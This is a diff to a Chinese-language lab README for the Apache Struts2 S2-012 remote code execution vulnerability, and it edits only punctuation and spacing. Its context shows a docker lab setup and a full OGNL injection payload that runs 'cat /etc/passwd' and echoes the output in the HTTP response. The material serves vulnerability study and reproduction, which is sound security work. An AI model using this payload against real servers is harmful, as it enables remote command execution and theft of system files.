@@ -1,8 +1,8 @@
 # S2-012 远程代码执行漏洞
 
-影响版本: 2.1.0 - 2.3.13
+影响版本：2.1.0 - 2.3.13
 
-漏洞详情: http://struts.apache.org/docs/s2-012.html
+漏洞详情：http://struts.apache.org/docs/s2-012.html
 
 ## 测试环境搭建
 
@@ -29,7 +29,7 @@ docker compose up -d
 
 ## Exp
 
-可以直接祭出s2-001中的回显POC，因为这里是没有沙盒，也没有限制任何特殊字符（为什么？）。
+可以直接祭出 s2-001 中的回显 POC，因为这里是没有沙盒，也没有限制任何特殊字符（为什么？）。
 
 ```
 %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat", "/etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
